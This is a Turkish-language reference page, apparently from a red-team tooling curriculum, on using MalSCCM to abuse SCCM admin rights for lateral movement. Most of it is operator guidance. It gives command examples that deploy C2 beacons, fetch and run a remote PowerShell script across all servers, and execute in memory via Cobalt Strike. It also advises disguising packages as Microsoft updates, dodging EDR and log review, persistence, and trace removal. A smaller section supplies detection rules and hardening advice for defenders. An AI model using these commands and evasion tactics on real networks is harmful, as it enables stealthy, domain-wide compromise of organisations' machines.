# MalSCCM

> **Kategori:** [10. KURUMSAL ALTYAPI, PAYLAŞIM VE VERİ AVI (ENTERPRISE DATA HUNTING)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft Endpoint Configuration Manager (SCCM / MECM) altyapısını kötüye kullanarak SMS Provider üzerinden hedefli cihaz koleksiyonları oluşturan, zararlı uygulama/paket dağıtan, anlık ilke yenilemesiyle hedef sistemlerde SYSTEM yetkisinde kod yürüten ve izleri temizleyen C# tabanlı yanal hareket ve yayılma aracı.

---

## 1. Genel Bakış ve Amaç

MalSCCM, Phil Keeble (@nettitude_labs / Sophos / LRQA Nettitude) tarafından geliştirilmiş, kurumsal Active Directory ortamlarında ele geçirilen SCCM/MECM yönetim ayrıcalıklarını silaha dönüştürerek hedef uç noktalarda uzaktan kod yürütmeyi (Remote Code Execution - RCE) ve etki alanı genelinde yanal yayılmayı otomatikleştiren bir C# (.NET) aracıdır.

Geleneksel yanal hareket teknikleri (PsExec, WMI/Win32_Process, WinRM) genellikle doğrudan kaynak makineden hedef makineye doğru ağ bağlantısı (SMB TCP 445 veya WinRM TCP 5985) açılmasını gerektirir. Bu durum, katı ana makine güvenlik duvarları (host firewall) ve ağ mikro-segmentasyonu uygulanan modern kurumsal ortamlarda engellenir. 

MalSCCM bu kısıtlamayı tamamen aşar: Operatör doğrudan hedef makineye bağlanmaz. Bunun yerine, merkezi SCCM Site Server üzerindeki SMS Provider (WMI `root\sms\site_<SiteCode>`) ile iletişim kurar. MalSCCM, hedef makineler için geçici bir cihaz koleksiyonu (Device Collection) tanımlar, operatörün belirlediği komutu içeren bir SCCM Uygulaması (Application) veya Paketi (Package/Program) oluşturur ve bunu koleksiyona "Zorunlu" (Required) olarak dağıtır. Hedef istemci üzerindeki `CcmExec.exe` servisi ilkeyi çeker ve komutu meşru SCCM yönetim trafiği kisvesi altında yerel `NT AUTHORITY\SYSTEM` yetkisiyle çalıştırır.

```
+-------------------------------------------------------------------------+
|                          MalSCCM Mimari Akışı                          |
+-------------------------------------------------------------------------+
                               |
               1. WMI / DCOM Bağlantısı (TCP 135)
               [root\sms\site_<SiteCode> (SMS Provider)]
                               v
                +------------------------------+
                | SCCM Site Server             |
                | (SMS Provider / SMS_Admin)   |
                +------------------------------+
                               |
               2. MalSCCM Otomasyon Adımları:
                  a) SMS_Collection Oluştur (Hedef Cihaz)
                  b) SMS_Package / SMS_Program Oluştur (Payload)
                  c) SMS_Advertisement Dağıtımı Yap (Required)
                  d) SMS_Collection.RequestRefresh() Çağır
                               |
               3. BGB / Notification Channel (TCP 10123 / HTTP)
               [BGB Push / Policy Notification]
                               v
                +------------------------------+
                | Hedef İstemci Sunucu / WS    |
                | (CcmExec.exe - SYSTEM)       |
                +------------------------------+
                               |
               4. İstemci İşletim Sistemi Eylemi:
                  - Management Point'ten (MP) İlkeyi İndir
                  - Komutu / Yükü SYSTEM Yetkisinde Koştur
                  - Status Message Raporla (Success)
                               |
                               v
                +------------------------------+
                | Operatör Temizlik Aşaması:   |
                | - Deployment & Package Sil   |
                | - Koleksiyonu ve İzi Kaldır  |
                +------------------------------+
```

### 1.1 MalSCCM Dağıtım Motoru ve Bileşenleri
MalSCCM, SCCM nesne modelini doğrudan WMI API sınıfları üzerinden programatik olarak yönetir:
* **`SMS_Collection`:** Belirli makinelerin `ResourceID` değerlerini sorgulayıp (`SMS_R_System`) bunları dinamik veya doğrudan kural (Direct Rule) ile izole bir hedef koleksiyonuna toplar.
* **`SMS_Package` & `SMS_Program`:** Çalıştırılacak payload komut dizesini (PowerShell, bat, exe veya C2 beacon) tanımlar.
* **`SMS_Advertisement` (Dağıtım):** Paketi hedeflenen koleksiyona bağlar. `AssignmentType = 1` (Required) ve `ActionInProgress = 0` atanarak kullanıcının onayı veya bakım penceresi (maintenance window) beklenmeksizin anında icra edilmesi sağlanır.
* **Push Notification (Client Refresh):** Normal şartlarda istemciler ilkeleri saatlik aralıklarla çeker. MalSCCM, BGB istemci bildirim kanalını tetikleyerek hedef makinenin ilkeyi saniyeler içinde çekmesini zorlar.

### 1.2 SCCM İstemci Yürütme Döngüsü ve İstemci Dosya Yolları
Hedef uç noktada ilke tetiklendiğinde `CcmExec.exe` servisi aşağıdaki adımları sırayla icra eder:
1. **Policy Download:** İstemci, Yönetim Noktası (MP) üzerinden `PolicyAgent.dll` ile yeni ilke GUID'sini (`CCM_Policy`) çeker ve yerel WMI havuzuna kaydeder.
2. **Content Download:** Eğer paket bir ikili dosya içeriyorsa, Dağıtım Noktası (DP) üzerinden BITS veya SMB ile içerik indirilir ve yerel istemci önbelleğine (`C:\Windows\ccmcache\<klasör>`) kopyalanır.
3. **Execution as SYSTEM:** İstemci yönetim modülü (`execmgr.dll`), tanımlı komut satırını doğrudan `NT AUTHORITY\SYSTEM` güvenlik bağlamında çalıştırır.
4. **Status Reporting:** Komut tamamlandığında dönüş kodu (`exit code`) ve başarı durumu, durum mesajı (Status Message) olarak Site Server'a raporlanır.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Ağ Segmentasyonu ve Güvenlik Duvarı Atlatma** | Kaynak ve hedef arasında doğrudan ağ erişimi (445/5985) olmasa dahi SCCM yönetim kanalı üzerinden hedefe ulaşma. |
| **Doğal Yetki Yükseltme (SYSTEM)** | SCCM istemcisi hedef makinede zaten `NT AUTHORITY\SYSTEM` çalıştığı için yükün doğrudan en üst yetkide koşturulması. |
| **EDR ve Savunma Mekanizmalarını Yanıltma** | Komutların `CcmExec.exe` meşru süreç ağacı altında türetilmesi, yönetimsel yazılım dağıtımı görünümü vererek alarmları zayıflatır. |
| **Toplu Yanal Yayılma** | Tek bir komutla onlarca veya yüzlerce hedef makineye aynı anda eşzamanlı payload dağıtımı yapabilme. |
| **Otomatik OPSEC Temizliği** | Komut icra edildikten sonra oluşturulan paketlerin, programların ve koleksiyonların WMI üzerinden temizlenmesi. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | MalSCCM | SharpSCCM | PsExec / WMIExec | SCCMHunter |
|---|---|---|---|---|
| **Ana Odak** | Silahlandırılmış Kod Dağıtımı & RCE | Keşif, NAA Çalma, Coercion | Doğrudan P2P Yanal Hareket | Python tabanlı SCCM Sömürü |
| **Doğrudan Ağ Erişimi Gereksinimi** | Hayır (Sadece Site Server) | Kısmi | Evet (Hedefe 445/135 şart) | Kısmi |
| **Süreç Ebeveyni (Parent Process)** | `CcmExec.exe` | Değişken / WMI | `services.exe` / `wmiprvse.exe` | Değişken |
| **Yükleme Tipi** | Application / Package / Program | CMPivot / Script / App | Servis ikilisi / Win32_Process | MP Policy Injection |
| **Otomatik İz Temizliği** | Evet (Dahili Cleanup bayrağı) | Manuel / Kısmi | Manuel servis silme | Manuel |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

MalSCCM, tek satırlık bir komutla koleksiyon oluşturma, yük tanımlama, dağıtma ve temizleme adımlarını sırayla icra edebilen esnek parametreler sunar.

### Genel Sözdizimi
```cmd
MalSCCM.exe -s <SiteServer> -c <SiteCode> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| Site Server | `-s`, `--server` | SMS Provider rolünü barındıran SCCM sunucusunun FQDN veya IP'si. | `-s sccm01.corp.local` |
| Site Code | `-c`, `--sitecode` | 3 karakterli SCCM Site Kodu. | `-c PS1` |
| Hedef Ana Makine | `-t`, `--target` | Komutun yürütüleceği hedef bilgisayarın NetBIOS adı veya FQDN'i. | `-t WS-DEV01` |
| Hedef Koleksiyon | `-col`, `--collection` | Yeni koleksiyon açmak yerine var olan mevcut koleksiyonu hedefler. | `-col "All Desktop and Server Clients"` |
| Komut Dizesi | `-cmd`, `--command` | Hedef makinede SYSTEM olarak koşturulacak komut dizesi. | `-cmd "powershell.exe -enc ..."` |
| Yük Dosyası | `-p`, `--payload` | Hedefe aktarılacak ikili (.exe, .dll, .bat) dosyanın yolu. | `-p C:\Temp\beacon.exe` |
| Dağıtım Adı | `-n`, `--name` | Oluşturulacak geçici paket ve programın ismi. | `-n "Critical-KB500124"` |
| Otomatik Temizlik | `-clean`, `--cleanup` | Komut yürütüldükten sonra oluşturulan koleksiyon, paket ve dağıtımı siler. | *Argümansız bayrak* |
| Zorunlu Bildirim | `-f`, `--force` | BGB push bildirimini tetikleyerek istemcinin ilkeyi hemen çekmesini zorlar. | *Argümansız bayrak* |
| Ayrıntılı Mod | `-v`, `--verbose` | Tüm WMI operasyonlarını ve hata mesajlarını konsola basar. | *Argümansız bayrak* |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Tek Bir Hedef Bilgisayara PowerShell Komutu Dağıtma ve Temizleme
Hedef sunucuya (`SRV-SQL01`) doğrudan ağ erişimi olmadan, SCCM Site Server üzerinden geçici paket oluşturarak komut çalıştırma ve ardından izleri silme.

```cmd
MalSCCM.exe -s sccm01.corp.local -c PS1 -t SRV-SQL01 -cmd "cmd.exe /c whoami > C:\Temp\whoami.txt" -clean -f
```

**Örnek Konsol Çıktısı:**
```text
[+] MalSCCM 1.0 started at 2026-10-14 20:30:00
[*] Connecting to SMS Provider: \\sccm01.corp.local\root\sms\site_PS1
[+] WMI connection established successfully!
[*] Resolving target machine: SRV-SQL01
[+] Found ResourceID: 16777220 (SRV-SQL01.corp.local)
[*] Creating temporary Device Collection: 'MalSCCM_SRV-SQL01_Temp'
[+] Collection created successfully with CollectionID: PS100045
[*] Adding ResourceID 16777220 to Collection PS100045 via Direct Rule...
[+] Target host successfully added to collection!
[*] Creating Package and Program:
    - Name: MalSCCM_Payload
    - CommandLine: cmd.exe /c whoami > C:\Temp\whoami.txt
[+] Package created with ID: PS10001A
[*] Creating Required Advertisement (Deployment) targeting Collection PS100045...
[+] Advertisement successfully deployed (AssignmentID: 16777230)
[*] Sending BGB Client Notification (Force Policy Refresh)...
[+] Notification sent! Target client will execute command immediately.
[*] Waiting 30 seconds before cleanup...
[*] Executing Cleanup Routine:
    [-] Deleting Advertisement AssignmentID: 16777230... Done.
    [-] Deleting Package PS10001A... Done.
    [-] Deleting Device Collection PS100045... Done.
[+] Operation completed cleanly.
```

### Senaryo 2: Cobalt Strike / Havoc C2 Beacon İkilisini Dağıtma
Dağıtım Noktası (Distribution Point) üzerinde barındırılmak üzere C2 beacon yükünü uzak makinelere dağıtarak oturum alma.

```cmd
MalSCCM.exe -s sccm01.corp.local -c PS1 -t WS-FINANCE05 -p C:\Payloads\agent.exe -cmd "agent.exe" -n "SecurityUpdate-Patch"
```

### Senaryo 3: Mevcut Bir Koleksiyon Üzerinden Toplu Komut Koşturma
Yeni koleksiyon oluşturmak yerine, sistemde zaten var olan bir sunucu koleksiyonunu (`All Servers`) hedef alarak toplu kalıcılık veya keşif komutu icra etme.

```cmd
MalSCCM.exe -s sccm01.corp.local -c PS1 -col "All Windows Server Systems" -cmd "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/recon.ps1')"
```

### Senaryo 4: Cobalt Strike execute-assembly ile Bellek İçi Yürütme
Aracı hedef makinede diske yazmadan Beacon süreci içerisinden bellek üzerinden çalıştırma.

```text
beacon> execute-assembly /opt/tools/MalSCCM.exe -s sccm01.corp.local -c PS1 -t TARGET01 -cmd "whoami /all" -clean
```

### Senaryo 5: Yalnızca Paket Oluşturma ve Manuel İnceleme
Dağıtım yapmadan yalnızca test amaçlı zararsız bir SCCM paketi tanımlayarak WMI izinlerini doğrulama.

```cmd
MalSCCM.exe -s sccm01.corp.local -c PS1 -cmd "hostname" -n "Audit-Package" -v
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `WMI Connection Failed: Access is denied. (Exception from HRESULT: 0x80070005)` | Operatörün SCCM Site Server üzerinde DCOM uzaktan etkinleştirme veya WMI okuma/yazma yetkisi yok. | SCCM "Full Administrator" veya en azından "Application Administrator" rolüne sahip bir hesap bağlamında çalıştırın. |
| `SMS Provider Error: Target computer not found in SMS_R_System.` | Hedef makine henüz SCCM envanterine girmemiş, kapatılmış veya adı yanlış yazılmış. | `SMS_R_System` sınıfını `Name` özniteliğiyle sorgulayarak makinenin SCCM'deki tam adını veya ResourceID'sini teyit edin. |
| `Deployment created but client does not execute the command.` | Hedef istemci çevrimdışı, `CcmExec` servisi durdurulmuş veya ağ güvenlik duvarı BGB bildirim portunu (TCP 10123) engelliyor. | İstemcinin açık olduğunu doğrulayın; `-f` ile bildirim zorlayın veya istemcinin bir sonraki olağan ilke çekme döngüsünü bekleyin. |
| `Generic failure (0x80041001) while creating SMS_Collection.` | Belirtilen koleksiyon adı zaten mevcut veya SMS Provider SQL veritabanı kilitlenme yaşıyor. | `-n` parametresi ile benzersiz bir koleksiyon/paket adı belirleyin. |
| `Package creation succeeded but Distribution Point transfer failed.` | Dağıtım Noktası (DP) depolama alanı dolu veya içerik kitaplığına (Content Library) erişim yetkisi yetersiz. | İkili yük (`-p`) göndermek yerine doğrudan tek satırlık komut dizesi (`-cmd`) kullanarak DP dosya aktarımını bypass edin. |
| `Cleanup failed: Collection is in use by an active deployment.` | Dağıtım silinmeden önce koleksiyon silinmeye çalışılmış. | MalSCCM'in temizleme rutini sırasını bekleyin veya SCCM konsolundan/WMI üzerinden manuel olarak önce Advertisement nesnesini silin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

MalSCCM, ağ katmanında meşru SCCM yönetim trafiğini kullandığı için P2P yanal hareket tespitlerini (PsExec/WinRM) etkisiz bırakır. Ancak merkezi Site Server ve hedef istemci üzerindeki uç nokta günlüklerinde çok net kurumsal izler bırakır.

```
[MalSCCM Yürütmesi]
          │
          ├──> SMS Provider WMI Oturumu ────────> Event ID 4624 (Logon Type 3 / DCOM)
          │                                      WMI Operational Event ID 5861
          │
          ├──> Yeni Paket / Koleksiyon ──────────> SCCM Status Message: 30000, 30001
          │                                      (Package/Collection Created by User)
          │
          ├──> Hedef İstemci İlke Çekme ─────────> PolicyAgent.log & execmgr.log
          │
          └──> Komut Yürütme (Payload) ──────────> AppEnforce.log / execmgr.log
                                                 Sysmon Event ID 1 (CcmExec.exe -> cmd.exe)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Hedef İstemci Günlükleri (`C:\Windows\CCM\Logs`):**
  * `execmgr.log`: Yürütülen programın adı, komut satırı ve dönüş kodu (`Execution is complete for program... Exit code: 0`).
  * `AppEnforce.log`: Uygulama modeli dağıtıldıysa, çalıştırılan komut dizesi açık metin olarak loglanır.
  * `PolicyAgent.log`: Yeni ilkenin indirildiği zaman damgası ve ilke kimliği (PolicyID).
* **Site Server Olay ve Durum Mesajları:**
  * SCCM Status Message ID 30000 (Collection Created) ve 30001 (Collection Modified).
  * Windows Event ID 4624 (Logon Type 3): Operatörün Site Server'a DCOM/WMI üzerinden oturum açması.
* **Sysmon Event ID 1 (Process Creation):** `ParentImage: C:\Windows\CCM\CcmExec.exe` tarafından `cmd.exe`, `powershell.exe` veya bilinmeyen bir ikilinin başlatılması.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Lateral Movement** | [T1072](https://attack.mitre.org/techniques/T1072/) | Software Deployment Tools | SCCM paket ve uygulama dağıtımı üzerinden yanal yayılma. |
| **Execution** | [T1047](https://attack.mitre.org/techniques/T1047/) | Windows Management Instrumentation | SMS Provider üzerinden WMI nesnelerinin manipülasyonu. |
| **Privilege Escalation** | [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | İstemcilerde doğrudan yerel `SYSTEM` yetkisi elde etme. |
| **Defense Evasion** | [T1070](https://attack.mitre.org/techniques/T1070/) | Indicator Removal | Dağıtım sonrası koleksiyon ve paketlerin otomatik silinmesi (`-clean`). |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **CcmExec Süreç Anomalisi** | `CcmExec.exe` sürecinin şüpheli parametrelerle `powershell.exe` türetmesi. | Komut satırına doğrudan C2 komutu yazmak yerine meşru bir Windows sistem ikilisini (LOLBIN) veya imzalı scripti tetikleyin. |
| **SCCM Denetim Mesajları** | Gece yarısı veya olağandışı saatte yeni koleksiyon/paket oluşturulması. | Yeni koleksiyon açmak yerine mevcut ve aktif olan kurumsal koleksiyonları kullanın; operasyon bitince `-clean` ile silin. |
| **İstemci Log Dosyaları** | `execmgr.log` dosyasında açık komut satırının kalması. | Komutu doğrudan parametre olarak vermek yerine Base64 veya harici bir şifreli dosya üzerinden okutun. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (Suspicious Process Spawned by SCCM Client)
```yaml
title: Suspicious Execution via SCCM Client (CcmExec.exe)
id: a1b2c3d4-4321-8765-dcba-0987654321fe
status: production
description: SCCM istemci servisi (CcmExec.exe) tarafından başlatılan olağandışı komut satırı veya script yorumlayıcıları tespit edildi.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    ParentImage|endswith: '\CcmExec.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cscript.exe'
      - '\wscript.exe'
    CommandLine|contains:
      - '-enc'
      - 'whoami'
      - 'net user'
      - 'http'
  condition: selection
falsepositives:
  - Kuruluşun meşru BT kurulum ve yama betikleri
level: high
```

#### Microsoft Sentinel KQL Sorgusu
```kql
DeviceProcessEvents
| where InitiatingProcessFileName =~ "CcmExec.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "downloadstring", "whoami", "net localgroup")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule MalSCCM_Assembly_Detection {
    meta:
        description = "MalSCCM SCCM sömürü ve yanal hareket aracı tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/nettitude/MalSCCM"
    strings:
        $s1 = "MalSCCM" ascii wide nocase
        $s2 = "SMS_Collection" ascii wide
        $s3 = "SMS_Package" ascii wide
        $s4 = "SMS_Advertisement" ascii wide
        $s5 = "SMS_R_System" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **SCCM Rol Tabanlı Erişim Denetimi (RBAC):** SCCM yönetim konsoluna ve SMS Provider'a erişim hakkı strictly sınırlandırılmalı; "Full Administrator" yetkisi en aza indirilmeli, çok faktörlü kimlik doğrulama (MFA) şart koşulmalıdır.
* **WMI Uzaktan Erişim İzinleri:** SMS Provider sunucusunda standart kullanıcıların DCOM ve WMI ad alanlarına (`root\sms`) uzaktan erişmesi engellenmelidir.
* **Uygulama İzin Listesi (AppLocker / WDAC):** İstemci makinelerde `CcmExec.exe` tarafından başlatılan script ve ikililer uygulama denetim kurallarına (Application Whitelisting) tabi tutulmalı, geçici dizinlerden (`C:\Windows\Temp`, `C:\ProgramData`) çalıştırılan kodlar engellenmelidir.
* **execmgr.log ve SIEM Entegrasyonu:** SCCM istemci günlükleri (`execmgr.log`, `AppEnforce.log`) merkezi log toplama sistemine aktarılarak anormal paket çalıştırmaları anında izlenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Tek Bir Hedefe Komut Dağıtma ve Otomatik Temizlik
MalSCCM.exe -s sccm01.corp.local -c PS1 -t WS-TARGET01 -cmd "cmd.exe /c whoami" -clean -f

# 2. İkili Payload (.exe) Dağıtımı ve İcra Edilmesi
MalSCCM.exe -s sccm01.corp.local -c PS1 -t SRV-APP01 -p C:\Temp\agent.exe -cmd "agent.exe" -n "CriticalHotfix"

# 3. Mevcut Bir Koleksiyona Toplu Dağıtım Gerçekleştirme
MalSCCM.exe -s sccm01.corp.local -c PS1 -col "All Workstations" -cmd "powershell.exe -enc ..."

# 4. Yalnızca Hedef Cihaz İçin Koleksiyon Oluşturma (Dağıtım Yok)
MalSCCM.exe -s sccm01.corp.local -c PS1 -t WS-TARGET01 -n "Test-Collection" -v

# 5. BGB Push Bildirimi Zorlayarak Anında İcra Ettirme
MalSCCM.exe -s sccm01.corp.local -c PS1 -t WS-TARGET01 -cmd "hostname" -f

# 6. Temizlik Yapmadan Kalıcı Paket Tanımlama
MalSCCM.exe -s sccm01.corp.local -c PS1 -t SRV-DB01 -cmd "C:\Windows\System32\calc.exe" -n "PersistentTask"

# 7. SMS Provider Bağlantısını ve WMI İzinlerini Doğrulama
MalSCCM.exe -s sccm01.corp.local -c PS1 -v

# 8. Çoklu Hedef Belirterek Küçük Bir Gruba Dağıtım
MalSCCM.exe -s sccm01.corp.local -c PS1 -t WS-DEV01,WS-DEV02 -cmd "whoami /priv" -clean -f

# 9. Özel Paket Adı Belirterek Kamuflaj Sağlama
MalSCCM.exe -s sccm01.corp.local -c PS1 -t WS-TARGET01 -cmd "net user" -n "Microsoft-Edge-Update-KB98231" -clean

# 10. Ayrıntılı Log Çıktısıyla Hata Ayıklama Modunda Dağıtım
MalSCCM.exe -s sccm01.corp.local -c PS1 -t WS-TARGET01 -cmd "ipconfig /all" -v -clean
```

### Komut Detay Analizleri

#### 1. Tek Bir Hedefe Komut Dağıtma ve Otomatik Temizlik
* **Ne Yapar?:** SMS Provider'a bağlanır, hedef için geçici koleksiyon ve paket oluşturur, zorunlu dağıtım yapar, BGB ile hemen çalıştırır ve ardındaki tüm WMI nesnelerini siler.
* **Ne Zaman Kullanılır?:** Hedef makinede doğrudan ağ bağlantısı olmadan en hızlı ve en az iz bırakan yanal hareket için.
* **Parametreler:**
  * `-t WS-TARGET01`: Hedef bilgisayar.
  * `-cmd "cmd.exe /c whoami"`: Yürütülecek işletim sistemi komutu.
  * `-clean`: Operasyon bitiminde nesneleri siler.
  * `-f`: Anında ilke çekilmesini zorlar.

#### 2. İkili Payload (.exe) Dağıtımı ve İcra Edilmesi
* **Ne Yapar?:** Yerel ikili dosyayı SCCM içerik kütüphanesine aktarır, paket olarak paketler ve hedefte `SYSTEM` olarak çalıştırır.
* **Ne Zaman Kullanılır?:** C2 ajanı veya karmaşık bir derlenmiş aracı uzak makineye ulaştırmak için.
* **Parametreler:**
  * `-p C:\Temp\agent.exe`: Yüklenecek dosya yolu.
  * `-n "CriticalHotfix"`: Paketin meşru görünmesini sağlayan kamuflaj adı.

#### 3. Mevcut Bir Koleksiyona Toplu Dağıtım Gerçekleştirme
* **Ne Yapar?:** Yeni koleksiyon açmaz; etki alanındaki önceden tanımlanmış geniş cihaz grubuna aynı anda komut gönderir.
* **Ne Zaman Kullanılır?:** Kuruluş genelinde eşzamanlı ve kitlesel yanal yayılma veya veri toplama gerektiğinde.
* **Parametreler:**
  * `-col "All Workstations"`: Hedeflenen mevcut SCCM koleksiyonu.

#### 4. Yalnızca Hedef Cihaz İçin Koleksiyon Oluşturma (Dağıtım Yok)
* **Ne Yapar?:** Paket oluşturmadan sadece hedef makinenin ResourceID'sini bulur ve koleksiyona üye yapar.
* **Ne Zaman Kullanılır?:** Dağıtım öncesi hedef cihazın SCCM tarafından tanındığını test etmek için.
* **Parametreler:**
  * `-v`: Detaylı WMI durum mesajlarını gösterir.

#### 5. BGB Push Bildirimi Zorlayarak Anında İcra Ettirme
* **Ne Yapar?:** SCCM Client Notification kanalına özel sinyal göndererek hedef istemcinin beklemeden ilkeyi indirmesini sağlar.
* **Ne Zaman Kullanılır?:** Normalde saatler sürebilecek ilke döngüsünü saniyelere indirmek için.
* **Parametreler:**
  * `-f`: Force push bayrağı.

#### 6. Temizlik Yapmadan Kalıcı Paket Tanımlama
* **Ne Yapar?:** Dağıtılan paketi ve koleksiyonu silmez; SCCM veritabanında bırakarak sürekli veya tekrarlı çalışmaya olanak tanır.
* **Ne Zaman Kullanılır?:** Altyapı üzerinde uzun vadeli kalıcılık (persistence) sağlamak istendiğinde.
* **Parametreler:**
  * `-clean` bayrağı kullanılmaz.

#### 7. SMS Provider Bağlantısını ve WMI İzinlerini Doğrulama
* **Ne Yapar?:** Hiçbir hedef makineyi rahatsız etmeden sadece Site Server ile el sıkışır ve WMI yetkilerini test eder.
* **Ne Zaman Kullanılır?:** Operatörün SCCM ayrıcalıklarına sahip olup olmadığını tespit etmek için ön denetim aşamasında.
* **Parametreler:**
  * Sadece sunucu (`-s`) ve site kodu (`-c`) verilir.

#### 8. Çoklu Hedef Belirterek Küçük Bir Gruba Dağıtım
* **Ne Yapar?:** Virgülle ayrılmış birkaç hedef makineyi tek bir koleksiyona ekler ve yükü bu gruba uygular.
* **Ne Zaman Kullanılır?:** Birbiriyle ilişkili 2-3 sunucuya (örneğin veritabanı kümesi) aynı anda sızmak için.
* **Parametreler:**
  * `-t WS-DEV01,WS-DEV02`: Çoklu hedef listesi.

#### 9. Özel Paket Adı Belirterek Kamuflaj Sağlama
* **Ne Yapar?:** Oluşturulan pakete kurumsal bir güncelleme veya yama ismi vererek SCCM konsolunu izleyen sistem yöneticilerini yanıltır.
* **Ne Zaman Kullanılır?:** Konsol üzerinde fark edilme riskini en aza indirmek için.
* **Parametreler:**
  * `-n "Microsoft-Edge-Update-KB98231"`: Kamuflaj paket başlığı.

#### 10. Ayrıntılı Log Çıktısıyla Hata Ayıklama Modunda Dağıtım
* **Ne Yapar?:** WMI çağrılarının her aşamasını, dönen HRESULT kodlarını ve SOAP/RPC yanıtlarını konsola döker.
* **Ne Zaman Kullanılır?:** Dağıtım başarısız olduğunda veya ağ erişim sorunlarını incelerken.
* **Parametreler:**
  * `-v`: Verbose modu etkinleştirir.

---

## Kaynaklar
* [MalSCCM Resmi GitHub Deposu](https://github.com/nettitude/MalSCCM)
* [Nettitude Blog: Lateral Movement via Microsoft Endpoint Configuration Manager](https://labs.nettitude.com/)
* [MITRE ATT&CK: Software Deployment Tools (T1072)](https://attack.mitre.org/techniques/T1072/)
* [Microsoft Dokümantasyonu: SMS Provider WMI Reference](https://learn.microsoft.com/en-us/mem/configmgr/develop/reference/configuration-manager-reference)

---

> **Önceki:** [← SharpSCCM](./SharpSCCM.md) · **Sonraki:** [NetExec (Kategori 11) →](../Kategori_11_Yanal_Hareket_ve_Uzak_Kod_Yurutme/NetExec_nxc.md)
